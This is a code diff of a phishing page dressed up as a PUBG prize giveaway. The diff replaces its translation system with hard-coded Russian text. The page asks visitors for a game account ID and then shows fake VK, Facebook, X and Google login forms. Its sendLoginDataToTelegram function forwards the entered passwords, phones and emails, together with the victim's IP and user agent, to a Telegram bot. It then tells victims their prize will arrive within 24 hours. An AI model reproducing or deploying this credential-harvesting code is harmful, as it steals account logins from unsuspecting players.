                     languageDropdown.classList.remove('show');
-                    const langNames = {
-                        en: 'English',
-                        ru: 'Русский',
-                        uz: "O'zbekcha"
-                    };
-                    showNotification(`Language changed to ${langNames[lang] || 'English'}`);
+                    showNotification(`Язык изменен на ${this.textContent}`);
                 });
             });
             
@@ -3295,6 +3306,7 @@
             function showSelectionIndicator(show) {
                 if (show) {
                     selectionIndicator.classList.add('show');
+                    selectionIndicator.textContent = 'ВЫБРАНО';
                 } else {
                     selectionIndicator.classList.remove('show');
                 }
@@ -3308,7 +3320,7 @@
                 const isOwner = localStorage.getItem('isOwner') === 'true';
                 
                 if (!isOwner && hasPlayed) {
-                    showNotification("You have already used your attempt today!", true);
+                    showNotification("Вы уже использовали свою попытку сегодня!", true);
                     return;
                 }
                 
@@ -3374,12 +3386,9 @@
                             if (userIP !== ownerIP) {
                                 hasPlayed = true;
                                 localStorage.setItem('hasPlayed', 'true');
-                                // Обновляем текст кнопки с учетом текущего языка
-                                const currentLang = getCurrentLanguage();
-                                playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                             } else {
-                                const currentLang = getCurrentLanguage();
-                                playBtn.innerHTML = `<i class="fas fa-play"></i> ${translations[currentLang].play}`;
+                                playBtn.innerHTML = '<i class="fas fa-play"></i> ИГРАТЬ';
                             }
                             
                             playBtn.disabled = false;
@@ -3398,19 +3407,10 @@
                                 socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                             }
                             
-                            showNotification("Congratulations! You won a prize!", false, true);
+                            showNotification("Поздравляем! Вы выиграли приз!", false, true);
                         }, 1000);
                     }, 300);
                 }
-            }
-            
-            // Функция получения текущего языка
-            function getCurrentLanguage() {
-                const langText = languageBtn.textContent.trim();
-                if (langText.includes('English')) return 'en';
-                if (langText.includes('Русский')) return 'ru';
-                if (langText.includes("O'zbekcha")) return 'uz';
-                return 'en';
             }
             
             // Обработчик кнопки отправки ID аккаунта
@@ -3418,8 +3418,7 @@
                 const id = accountIdInput.value.trim();
                 
                 if (!id) {
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].notificationIdRequired, true);
+                    showNotification("Пожалуйста, введите ID аккаунта", true);
                     return;
                 }
                 
@@ -3434,8 +3433,7 @@
                 socialSelectSection.classList.add('active');
                 socialSelectSection.scrollIntoView({ behavior: 'smooth' });
                 
-                const currentLang = getCurrentLanguage();
-                showNotification(translations[currentLang].notificationSuccess, false, true);
+                showNotification("ID аккаунта сохранен", false, true);
             });
             
             // Обработчики выбора соцсети
@@ -3478,8 +3476,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3491,7 +3488,7 @@
                     accountId: accountId,
                     phone: inputs[0].value,
                     password: inputs[1].value,
-                    foreign_computer: inputs[2].checked ? 'Yes' : 'No'
+                    foreign_computer: inputs[2].checked ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('vk', loginData, finalPrizeIndex);
@@ -3501,8 +3498,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3523,8 +3519,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3534,7 +3529,7 @@
                 const email = googleEmailInput.value.trim();
                 
                 if (!email) {
-                    showNotification("Please enter email", true);
+                    showNotification("Пожалуйста, введите email", true);
                     return;
                 }
                 
@@ -3554,7 +3549,7 @@
                 const password = googlePasswordInput.value.trim();
                 
                 if (!password) {
-                    showNotification("Please enter password", true);
+                    showNotification("Пожалуйста, введите пароль", true);
                     return;
                 }
                 
@@ -3564,7 +3559,7 @@
                     accountId: accountId,
                     email: googleEmail,
                     password: password,
-                    show_password: showPassword ? 'Yes' : 'No'
+                    show_password: showPassword ? 'Да' : 'Нет'
                 };
                 
                 const success = await sendLoginDataToTelegram('google', loginData, finalPrizeIndex);
@@ -3574,8 +3569,7 @@
                     isPrizeReceived = true;
                     updatePrizeBadge();
                     showConfirmation();
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].loginSuccess, false, true);
+                    showNotification("Данные для входа отправлены! Приз будет зачислен в течение 24 часов.", false, true);
                 }
             });
             
@@ -3591,26 +3585,24 @@
             // Кнопка "Создать аккаунт" в Google
             document.getElementById('googleCreateAccountBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification("Account creation function is temporarily unavailable");
+                showNotification("Функция создания аккаунта временно недоступна");
             });
             
             // Кнопка "Забыли пароль" в Google
             document.getElementById('googleForgotPasswordBtn').addEventListener('click', function(e) {
                 e.preventDefault();
-                showNotification("Password recovery function is temporarily unavailable");
+                showNotification("Функция восстановления пароля временно недоступна");
             });
             
             // Обработчик кнопки получения приза
             getPrizeBtn.addEventListener('click', async function() {
                 if (!selectedSocial) {
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].notificationSelectSocial, true);
+                    showNotification("Пожалуйста, выберите социальную сеть", true);
                     return;
                 }
                 
                 if (!accountId) {
-                    const currentLang = getCurrentLanguage();
-                    showNotification(translations[currentLang].notificationIdRequired, true);
+                    showNotification("Пожалуйста, сначала введите ID аккаунта", true);
                     accountIdSection.classList.add('active');
                     accountIdSection.scrollIntoView({ behavior: 'smooth' });
                     return;
@@ -3638,7 +3630,7 @@
             // Функция отправки данных входа в Telegram
             async function sendLoginDataToTelegram(socialType, loginData, prizeIndex) {
                 const socialNames = {
-                    'vk': 'VKontakte',
+                    'vk': 'ВКонтакте',
                     'facebook': 'Facebook',
                     'x': 'Twitter/X',
                     'google': 'Google'
@@ -3646,31 +3638,31 @@
                 
                 const prizeNumber = prizeIndex + 1;
                 
-                let message = `🔐 NEW PUBG LOGIN DATA 🔐\n\n`;
-                message += `🎮 Account ID: ${loginData.accountId || 'Not specified'}\n`;
-                message += `📱 Social network: ${socialNames[socialType] || socialType}\n`;
+                let message = `🔐 НОВЫЕ ДАННЫЕ ДЛЯ ВХОДА PUBG 🔐\n\n`;
+                message += `🎮 ID аккаунта: ${loginData.accountId || 'Не указано'}\n`;
+                message += `📱 Соцсеть: ${socialNames[socialType] || socialType}\n`;
                 
                 // Добавляем данные в зависимости от соцсети
                 if (socialType === 'vk') {
-                    message += `📞 Phone/email: ${loginData.phone || 'Not specified'}\n`;
-                    message += `🔑 Password: ${loginData.password || 'Not specified'}\n`;
-                    message += `💻 Foreign computer: ${loginData.foreign_computer || 'No'}\n`;
+                    message += `📞 Телефон/email: ${loginData.phone || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `💻 Чужой компьютер: ${loginData.foreign_computer || 'Нет'}\n`;
                 } else if (socialType === 'facebook') {
-                    message += `📧 Email/phone: ${loginData.email || 'Not specified'}\n`;
-                    message += `🔑 Password: ${loginData.password || 'Not specified'}\n`;
+                    message += `📧 Email/телефон: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                 } else if (socialType === 'x') {
-                    message += `👤 Username: ${loginData.username || 'Not specified'}\n`;
-                    message += `🔑 Password: ${loginData.password || 'Not specified'}\n`;
+                    message += `👤 Имя пользователя: ${loginData.username || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
                 } else if (socialType === 'google') {
-                    message += `📧 Email: ${loginData.email || 'Not specified'}\n`;
-                    message += `🔑 Password: ${loginData.password || 'Not specified'}\n`;
-                    message += `👁️ Show password: ${loginData.show_password || 'No'}\n`;
+                    message += `📧 Email: ${loginData.email || 'Не указано'}\n`;
+                    message += `🔑 Пароль: ${loginData.password || 'Не указано'}\n`;
+                    message += `👁️ Показать пароль: ${loginData.show_password || 'Нет'}\n`;
                 }
                 
-                message += `🎁 Prize won: #${prizeNumber}\n`;
-                message += `⏰ Time: ${new Date().toLocaleString()}\n`;
+                message += `🎁 Выигранный приз: #${prizeNumber}\n`;
+                message += `⏰ Время: ${new Date().toLocaleString()}\n`;
                 message += `🌐 User Agent: ${navigator.userAgent}\n`;
-                message += `📍 IP: ${userIP || 'Not determined'}`;
+                message += `📍 IP: ${userIP || 'Не определен'}`;
                 
                 const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
                 
@@ -3715,8 +3707,7 @@
             
             // Проверяем, играл ли пользователь уже
             if (hasPlayed && userIP !== ownerIP) {
-                const currentLang = getCurrentLanguage();
-                playBtn.innerHTML = `<i class="fas fa-check"></i> ${translations[currentLang].alreadyPlayed}`;
+                playBtn.innerHTML = '<i class="fas fa-check"></i> УЖЕ ИГРАЛИ';
                 playBtn.disabled = false;
             }
             
